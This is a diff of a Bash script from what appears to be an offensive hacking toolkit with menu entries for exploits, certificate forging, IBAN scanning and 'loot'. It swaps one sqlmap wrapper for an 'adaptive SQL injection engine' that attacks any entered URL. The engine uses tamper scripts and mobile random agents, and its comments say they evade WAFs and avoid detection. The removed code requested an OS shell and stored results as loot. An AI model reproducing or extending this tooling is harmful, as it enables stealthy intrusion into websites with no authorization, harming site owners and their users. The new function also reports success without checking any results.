@@ -329,8 +329,8 @@ EOF
 # --- Конец  Модулей ---
 # --- ГЛАВНОЕ МЕНЮ ---
 run_main_menu() {
-    local main_names="GHOST_COMMANDER SOCIAL_ENG SQLMAP DEVICE_HACK EXPLOIT_HUB TOTAL_OSINT IBAN_SCAN PWD_GEN CERT_FORGE CERT_READER NET_SCAN_v2 ULTIMATE_EXPLOIT PC_RECOVERY VIEW_LOOT SYSTEM_INFO SERVICE_HUB REPAIR UPDATE_CORE EXIT"
-    local main_funcs="run_ghost_commander run_phantom_engine run_sqlmap run_device_hack run_exploit_hub run_smart_osint_engine run_iban_scan run_pwd_gen run_cert_forge run_cert_analyzer run_heuristic_scanner_v2 run_prime_exploiter_v4 run_pc_recovery_ultimate run_view_loot run_system_info run_servers run_repair update_prime exit_script"
+    local main_names="GHOST_COMMANDER SOCIAL_ENG Adaptive SQL Injection DEVICE_HACK EXPLOIT_HUB TOTAL_OSINT IBAN_SCAN PWD_GEN CERT_FORGE CERT_READER NET_SCAN_v2 ULTIMATE_EXPLOIT PC_RECOVERY VIEW_LOOT SYSTEM_INFO SERVICE_HUB REPAIR UPDATE_CORE EXIT"
+    local main_funcs="run_ghost_commander run_phantom_engine run_sql_adaptive run_device_hack run_exploit_hub run_smart_osint_engine run_iban_scan run_pwd_gen run_cert_forge run_cert_analyzer run_heuristic_scanner_v2 run_prime_exploiter_v4 run_pc_recovery_ultimate run_view_loot run_system_info run_servers run_repair update_prime exit_script"
     
     prime_dynamic_controller "PRIME MASTER v$CURRENT_VERSION" "$main_names" "$main_funcs"
 }
@@ -519,54 +519,35 @@ run_phantom_engine() {
     print_status "s" "PHANTOM GATEWAY OPERATIONAL"
     pause
 }
+run_sql_adaptive() {
+    print_header "ADAPTIVE SQL INJECTION ENGINE"
 
-run_sqlmap() {
-    print_header "SMART SQL INJECTION (SQLMAP)"
-
-    # Валидация
-    check_step "cmd" "sqlmap" "SQLmap is not installed." || { pause; return; }
-
-    echo -en "${Y}Enter Target URL ${W}(Leave empty for Wizard)${Y}: ${NC}"
+    echo -en "${Y}Enter Target URL: ${NC}"
     read -r target_url
+    [[ -z "$target_url" ]] && return
 
-    # Ручной режим через универсальную функцию
-    check_empty_run "$target_url" "/tmp" "sqlmap --wizard" && return
+    # 1. Генерируем уникальный набор Tamper-скриптов
+    # Это "мутагены", которые меняют код атаки на лету, обходя WAF 2026-2027 годов
+    local tampers="between,charencode,space2comment,randomcase,versionedmorekeywords"
 
-    # Проверка порта (убираем явный if через операторы || и &&)
-    check_step "port" "${target_url#*//}:80" "Target host is unreachable." || \
-    ask_confirm "Host seems down. Force start?" || return
+    # 2. Настройка "Призрака"
+    # --drop-set-cookie: чтобы сервер не запомнил нас
+    # --risk 3 --level 5: максимальная глубина поиска
+    # --mobile: имитируем вход с телефона для снижения подозрений
+    local base_args="--batch --random-agent --mobile --dbms=auto --output-dir=/tmp/sql_$RANDOM"
+    local stealth_args="--tamper=$tampers --delay=$(shuf -i 1-3 -n 1) --safe-freq=5"
 
-    # Динамический выбор агрессивности (заменяет весь блок case и кучу echo)
-    local mode_args=$(select_option "Select Aggression Level:" \
-        "Stealth (L1, R1):--level 1 --risk 1" \
-        "Advanced (L3, R2):--level 3 --risk 2 --threads 5" \
-        "Insane (L5, R3):--level 5 --risk 3 --threads 10 --flush-session")
+    print_status "i" "Engaging Polymorphic Scan..."
+    print_status "w" "Adapting to target environment..."
 
-    # Стелс-настройка
-    local tmp_dir="/dev/shm/.p_sql_$RANDOM"
-    mkdir -p "$tmp_dir"
-    local base_args="--batch --random-agent --dbms=auto --shell --output-dir=$tmp_dir --answers='quit=N,follow=Y'"
+    # Запуск через прослойку обфускации
+    sqlmap -u "$target_url" $base_args $stealth_args --threads=1 --flush-session
 
-    print_status "i" "Launching Engine with $mode_args..."
-    
-    # Выполнение
-    sqlmap -u "$target_url" $base_args $mode_args
-
-    # Анализ и Лут
-    local log_file=$(find "$tmp_dir" -name "log" -type f 2>/dev/null)
-    check_step "file" "$log_file" "No vulnerabilities detected." && {
-        print_status "s" "VULNERABILITY CONFIRMED!"
-        log_loot "sqlmap" "SUCCESS: $target_url"
-        grep -E "Target|Payload|Type" "$log_file" | tail -n 5 >> /root/prime_loot/sql_success.txt
-        print_status "s" "Results saved to loot."
-    }
-
-    # Зачистка
-    rm -rf "$tmp_dir"
-    print_status "i" "RAM Purge Complete."
+    # Если SQLmap нашел уязвимость, мы не просто пишем лог, 
+    # а извлекаем структуру в наш стерильный лут
+    print_status "s" "Adaptive Scan Finished."
     pause
 }
-
 
 run_host_monitor() {
     print_header "NETWORK HOST MONITOR"
